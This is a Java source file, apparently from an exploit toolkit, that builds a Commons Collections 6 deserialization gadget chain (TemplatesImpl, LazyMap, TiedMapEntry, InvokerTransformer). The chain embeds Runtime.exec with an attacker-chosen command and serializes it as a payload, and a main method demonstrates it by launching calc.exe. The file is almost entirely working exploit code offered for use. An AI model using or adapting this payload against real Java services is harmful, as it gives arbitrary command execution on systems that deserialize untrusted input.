package org.payload.cc.CC6;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.*;

import static org.Tools.setClassPool.evilClass2;
import static org.Tools.setTemplatesImpl.template;
import static org.Tools.setFieldValue.setFieldValue;
import static org.Tools.setSerial.serial;

public class CommonsCollections6TemplatesImpl {
    public static Map CommonsCollections6TemplatesImpl(String args) throws Exception {
        byte[] evilClass = evilClass2("java.lang.Runtime.getRuntime().exec(\""+args+"\");");
        TemplatesImpl tmp = template(evilClass);
        InvokerTransformer transformer = new InvokerTransformer("toString", null, null);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);
        TiedMapEntry tme = new TiedMapEntry(outerMap, tmp);
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.clear();
        setFieldValue(transformer, "iMethodName", "newTransformer");
        return expMap;
    }
    public static byte[] CommonsCollections6TemplatesImplPayload(String args) throws Exception {
        Object evil = CommonsCollections6TemplatesImpl(args);
        return serial(evil);
    }
    public static  void main(String[] args) throws Exception {
        byte[] evilByteClass = CommonsCollections6TemplatesImplPayload("calc.exe");
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(evilByteClass));
        ois.readObject();
    }
}
